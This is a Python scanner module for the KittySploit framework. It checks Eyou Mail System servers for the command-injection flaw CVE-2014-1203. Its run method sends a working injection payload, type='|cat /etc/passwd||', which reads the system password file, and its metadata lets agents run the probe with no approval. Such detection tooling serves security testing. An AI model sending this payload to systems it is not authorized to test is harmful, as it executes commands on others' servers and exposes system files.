#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Eyou Mail System before 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Eyou E-Mail <3.6 - Remote Code Execution Detection',
        'description': 'Eyou Mail System before 3.6 allows remote attackers to execute arbitrary commands via shell metacharacters in the domain parameter to admin/domain/ip_login_set/d_ip_login_get.php via the get_login_ip_config_file function.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2014', 'cve', 'seclists', 'rce', 'eyou', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-1203',
            'http://seclists.org/fulldisclosure/2014/Jan/32',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-1203',
    }

    def run(self):
        path = '/webadm/?q=moni_detail.do&action=gragh'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="type='|cat /etc/passwd||'\n")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Eyou E-Mail <3.6 - Remote Code Execution detected', path=path)
            return True
        return False

